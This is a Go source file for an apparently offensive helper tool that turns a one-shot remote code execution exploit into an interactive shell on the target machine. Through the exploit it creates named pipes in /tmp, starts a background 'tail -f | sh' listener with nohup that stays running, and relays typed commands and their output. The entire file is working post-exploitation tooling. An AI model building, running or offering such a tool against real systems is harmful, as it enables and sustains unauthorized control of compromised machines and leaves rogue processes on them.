package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/term"
)

const FIFO_IN_PATH = "/tmp/f.inp"
const FIFO_OUT_PATH = "/tmp/f.out"

const READ_DELAY = 1 * time.Second
const COMMAND_OUTPUT_DELAY = 500 * time.Millisecond

func main() {
	if len(os.Args) <= 1 {
		fmt.Fprintf(os.Stderr, "usage: %s <command to run>\n\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "example: %s python3 exploit.py\n", os.Args[0])
		fmt.Fprint(os.Stderr, "where\n  python3 exploit.py 'echo hi'\nruns\n  echo hi\non the remote machine and displays the result.\n\n")
		os.Exit(2)
	}

	if _, err := runCommand(fmt.Sprintf("rm -f %s; mkfifo %s; rm -f %s; mkfifo %s", FIFO_IN_PATH, FIFO_IN_PATH, FIFO_OUT_PATH, FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to create named pipes: %v", err)
	}

	if err := runCommandInBackground(fmt.Sprintf("exec 3<%s; sleep infinity", FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to start process keeping fifo open: %v", err)
	}

	if err := runCommandInBackground(fmt.Sprintf("tail -f %s | sh >%s 2>&1", FIFO_IN_PATH, FIFO_OUT_PATH)); err != nil {
		log.Fatalf("Failed to start shell process: %v", err)
	}

	err := runSession()

	fmt.Printf("Session ended with error %v. Note there may be rogue processes on the system.\n", err)
}

func runSession() error {
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		panic(err)
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	t := term.NewTerminal(os.Stdin, "> ")

	stopReadLoop := make(chan interface{})
	justSentCommand := make(chan interface{})
	readErr := make(chan error)

	// Read loop
	go (func() {
		for {
			select {
			case <-stopReadLoop:
				return
			case <-justSentCommand:
				time.Sleep(COMMAND_OUTPUT_DELAY)
			case <-time.After(READ_DELAY):
			}

			res, err := runCommand(fmt.Sprintf("timeout 0.1s cat %s || true", FIFO_OUT_PATH))
			if err != nil {
				readErr <- err
				return
			}

			t.Write(res)
		}
	})()

	// Write loop
	for {
		line, err := t.ReadLine()
		if err != nil {
			stopReadLoop <- nil
			return err
		}

		select {
		case err, ok := <-readErr:
			if ok {
				return err
			} else {
				return fmt.Errorf("read loop closed normally without write loop closing. This shouldnt have happened")
			}
		default:
			_, err := runCommand(fmt.Sprintf("echo %s > %s", shellQuote(line), FIFO_IN_PATH))
			if err != nil {
				stopReadLoop <- nil
				return err
			}
			justSentCommand <- nil
		}
	}
}

func runCommandInBackground(command string) error {
	_, err := runCommand(fmt.Sprintf("nohup sh -c %s >/dev/null 2>&1 &", shellQuote(command)))
	return err
}

func runCommand(command string) ([]byte, error) {
	wrappedCommand := fmt.Sprintf("sh -c %s 2>&1", shellQuote(command))

	var outputBuffer bytes.Buffer
	outputWriter := bufio.NewWriter(&outputBuffer)
	cmd := exec.Command(os.Args[1], append(os.Args[2:], wrappedCommand)...)
	cmd.Stdout = outputWriter
	cmd.Stderr = outputWriter

	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("command failed: %v and output %s", err, outputBuffer.String())
	}

	return outputBuffer.Bytes(), nil
}

func shellQuote(s string) string {
	if len(s) == 0 {
		return "''"
	}

	return "'" + strings.ReplaceAll(s, "'", "'\"'\"'") + "'"
}
